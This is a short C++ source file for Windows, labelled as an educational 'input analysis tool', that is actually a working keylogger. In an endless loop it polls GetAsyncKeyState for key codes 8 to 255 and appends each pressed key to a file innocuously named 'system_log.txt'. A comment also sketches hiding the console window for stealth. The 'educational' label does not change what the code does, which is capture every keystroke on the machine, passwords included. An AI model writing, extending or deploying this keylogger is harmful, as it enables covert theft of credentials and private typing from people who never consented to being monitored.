#include <iostream>
#include <windows.h>
#include <fstream>

// EDUCATIONAL PURPOSE ONLY: Simple Input Analysis Tool
// Demonstrates: Windows API usage, Bit Manipulation, File I/O

void logKey(int key, const char* filename) {
    std::ofstream file;
    // Open in append mode so we don't overwrite previous data
    file.open(filename, std::ios::app); 
    
    if (file.is_open()) {
        // Map ASCII codes to readable characters (simplified)
        if (key == VK_RETURN) file << "[ENTER]";
        else if (key == VK_BACK) file << "[BACKSPACE]";
        else if (key == VK_SPACE) file << " ";
        else {
            char c = static_cast<char>(key);
            file << c;
        }
        file.close();
    }
}

int main() {
    // Hide the console window (stealth mode simulation)
    // StealConsole(); // Uncommenting this requires writing the function

    const char* logFile = "system_log.txt";
    std::cout << "Monitoring input... (Press Ctrl+C to stop)" << std::endl;

    while (true) {
        // Loop through printable ASCII characters
        for (int i = 8; i <= 255; i++) {
            // GetAsyncKeyState returns a short. 
            // The least significant bit is set if the key was pressed since the last call.
            // BIT MANIPULATION: We use Bitwise AND (&) to mask everything but the last bit.
            if (GetAsyncKeyState(i) & 1) { 
                logKey(i, logFile);
            }
        }
        Sleep(10); // Prevent high CPU usage
    }
    return 0;
}
